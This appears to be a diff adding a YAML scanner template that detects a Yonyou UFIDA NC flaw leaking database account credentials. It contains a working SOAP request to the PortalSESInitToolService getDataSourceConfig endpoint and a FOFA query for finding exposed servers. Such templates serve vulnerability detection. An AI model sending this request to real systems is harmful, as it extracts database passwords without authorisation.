@@ -1,0 +1,30 @@
+id: yonyou-nc-portalsesInittoolservice-disclosure
+
+info:
+  name: 用友 portalsesInittoolservice 泄露数据库账号密码
+  author: zan8in
+  severity: high
+  verified: true
+  description: |
+    用友 portalsesInittoolservice 泄露数据库账号密码
+    fofa: app="用友-UFIDA-NC"
+  tags: yonyou,disclosure
+  created: 2025/05/06
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /uapws/service/nc.itf.ses.inittool.PortalSESInitToolService
+      body: |
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:por="http://inittool.ses.itf.nc/PortalSESInitToolService">
+        <soapenv:Header/>
+        <soapenv:Body>
+            <por:getDataSourceConfig/>
+        </soapenv:Body>
+        </soapenv:Envelope>
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'<ns1:getDataSourceConfigResponse') &&
+      response.body.bcontains(b'ns1:getDataSourceConfigResponse>')
+expression: r0()
